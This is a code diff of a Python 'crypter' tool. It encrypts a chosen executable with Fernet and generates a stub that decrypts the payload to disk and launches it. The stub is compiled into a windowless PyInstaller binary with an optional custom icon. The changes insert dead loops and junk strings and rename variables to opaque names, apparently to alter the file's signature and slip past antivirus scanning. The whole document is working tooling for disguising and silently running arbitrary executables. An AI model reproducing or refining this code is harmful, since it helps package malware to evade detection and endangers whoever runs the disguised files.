@@ -2,32 +2,43 @@ from cryptography.fernet import Fernet
 from tkinter import filedialog
 import os
 
-
-def main(origin_file, new_file_name, icon, extract_file):
+def main(origin_file, new_file_name, icon):
     with open(origin_file, "rb")as file:
         origin_file_content = file.read()
     encrypted_text, key = encryption(origin_file_content)
-    pseudo_text = """from os import startfile, remove, path
+    pseudo_text = """from os import startfile
 from cryptography.fernet import Fernet
-def main(key, text_to_decrypt):
-    file_name = "{}.exe"
+
+
+def main(dbr1, iol):
+    file_name = "Datei.exe"
+    x = 12
+    while x < 20:
+        n = 0
+        x += 1
     with open(file_name, "wb")as file:
-        file.write(decryption(text_to_decrypt, key))
+        file.write(decryption(iol, dbr1))
     startfile(file_name)
-    
-def decryption(text_to_decrypt, key):
-    method = Fernet(key)
-    decrypt_text = method.decrypt(text_to_decrypt)  
-    return decrypt_text
-key = {}
-text_to_decrypt = {}
-main(key, text_to_decrypt)
-""".format(extract_file, key, encrypted_text)
+
+
+def decryption(text_to_decrypt, dbr2):
+    method = Fernet(dbr2)
+    d = "daccada"
+    d += "jiejd3j02"
+    elephant = method.decrypt(text_to_decrypt)
+    return elephant
+
+
+dbr = {}
+string = {}
+main(dbr, string)
+""".format(key, encrypted_text)
     with open(new_file_name, "w")as n:
         n.write(pseudo_text)
     if icon is None:
         os.system(f"Pyinstaller -F -w {new_file_name}")
     else:
+        print(f"Pyinstaller -i {icon} -F -w {new_file_name}")
         os.system(f"Pyinstaller -i {icon} -F -w {new_file_name}")
     os.remove(new_file_name)
 
@@ -43,10 +54,9 @@ if __name__ == '__main__':
     f = filedialog.askopenfilename(filetypes=(("exe files", "*.exe"), ("all files", "*.*")))
     new_file_name = input("Name of new File(without .py): ")
     new_file_name += ".py"
-    name_of_extract_file = input("Name of extract file(without exe): ")
     icon_input = input("Custom Icon(.ico)(Y/N): ")
     if icon_input == "Y" or icon_input == "y":
         icon = filedialog.askopenfilename(filetypes=(("ico files", "*.ico"), ("all files", "*.*")))
     else:
         icon = None
-    main(f, new_file_name, icon, name_of_extract_file)
+    main(f, new_file_name, icon)
